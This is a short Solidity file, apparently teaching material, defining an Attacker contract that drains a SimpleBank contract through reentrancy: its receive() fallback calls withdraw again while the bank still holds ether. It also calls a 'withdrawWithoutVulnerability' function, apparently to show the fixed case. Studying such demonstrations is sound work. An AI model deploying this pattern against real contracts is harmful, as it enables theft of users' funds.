// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {SimpleBank} from "./SimpleBank.sol";

contract Attacker {
    SimpleBank simpleBank;

    constructor(address _simpleBankAddress) {
        simpleBank = SimpleBank(_simpleBankAddress);
    }

    function attack() external payable {
        simpleBank.deposit{value: msg.value}();
        simpleBank.withdraw(msg.value);
    }

    function attackWithoutVulnerability() external payable {
        simpleBank.deposit{value: msg.value}();
        simpleBank.withdrawWithoutVulnerability(msg.value);
    }

    receive() external payable {
        uint256 bankBalance = address(simpleBank).balance;
        if (bankBalance > 0) {
            simpleBank.withdraw(msg.value);
        }
    }
}
